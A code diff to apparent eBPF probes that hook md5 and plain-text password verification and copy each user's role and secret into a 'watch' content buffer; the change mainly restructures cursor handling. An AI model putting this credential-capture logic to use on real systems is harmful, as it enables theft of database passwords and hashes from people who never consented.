@@ -153,42 +153,40 @@ int trace_md5_crypt_verify(struct pt_regs *ctx)
     // copy role
     #pragma unroll
     for (int i = 0; i < MAX_ROLE_LEN; i++) {
+        u32 pos = *cursor;
         if (creds.role[i] == 0) {
-            if (*cursor < FS_WATCH_MAX_CONTENT) {
-                watch->content[*cursor] = 35;
+            if (pos < FS_WATCH_MAX_CONTENT) {
+                watch->content[pos] = 35;
             }
-            *cursor += 1;
+            *cursor = pos + 1;
             goto copy_secret;
         }
 
-        // needed for the verifier
-        if (*cursor >= FS_WATCH_MAX_CONTENT) {
+        if (pos >= FS_WATCH_MAX_CONTENT) {
             goto copy_secret;
-        } else {
-            watch->content[*cursor] = creds.role[i];
         }
-        *cursor += 1;
+        watch->content[pos] = creds.role[i];
+        *cursor = pos + 1;
     }
 
 copy_secret:
     // copy secret
     #pragma unroll
     for (int i = 0; i < MD5_LEN; i++) {
+        u32 pos = *cursor;
         if (creds.secret[i] == 0) {
-            if (*cursor < FS_WATCH_MAX_CONTENT) {
-                watch->content[*cursor] = 10;
+            if (pos < FS_WATCH_MAX_CONTENT) {
+                watch->content[pos] = 10;
             }
-            *cursor += 1;
+            *cursor = pos + 1;
             goto next;
         }
 
-        // needed for the verifier
-        if (*cursor >= FS_WATCH_MAX_CONTENT) {
+        if (pos >= FS_WATCH_MAX_CONTENT) {
             goto next;
-        } else {
-            watch->content[*cursor] = creds.secret[i];
         }
-        *cursor += 1;
+        watch->content[pos] = creds.secret[i];
+        *cursor = pos + 1;
     }
 
 next:
@@ -304,42 +302,40 @@ int trace_plain_crypt_verify(struct pt_regs *ctx)
     // copy role
     #pragma unroll
     for (int i = 0; i < MAX_ROLE_LEN; i++) {
+        u32 pos = *cursor;
         if (creds.role[i] == 0) {
-            if (*cursor < FS_WATCH_MAX_CONTENT) {
-                watch->content[*cursor] = 35;
+            if (pos < FS_WATCH_MAX_CONTENT) {
+                watch->content[pos] = 35;
             }
-            *cursor += 1;
+            *cursor = pos + 1;
             goto copy_secret;
         }
 
-        // needed for the verifier
-        if (*cursor >= FS_WATCH_MAX_CONTENT) {
+        if (pos >= FS_WATCH_MAX_CONTENT) {
             goto copy_secret;
-        } else {
-            watch->content[*cursor] = creds.role[i];
         }
-        *cursor += 1;
+        watch->content[pos] = creds.role[i];
+        *cursor = pos + 1;
     }
 
 copy_secret:
     // copy secret
     #pragma unroll
     for (int i = 0; i < MD5_LEN; i++) {
+        u32 pos = *cursor;
         if (creds.secret[i] == 0) {
-            if (*cursor < FS_WATCH_MAX_CONTENT) {
-                watch->content[*cursor] = 10;
+            if (pos < FS_WATCH_MAX_CONTENT) {
+                watch->content[pos] = 10;
             }
-            *cursor += 1;
+            *cursor = pos + 1;
             goto next;
         }
 
-        // needed for the verifier
-        if (*cursor >= FS_WATCH_MAX_CONTENT) {
+        if (pos >= FS_WATCH_MAX_CONTENT) {
             goto next;
-        } else {
-            watch->content[*cursor] = creds.secret[i];
         }
-        *cursor += 1;
+        watch->content[pos] = creds.secret[i];
+        *cursor = pos + 1;
     }
 
 next:
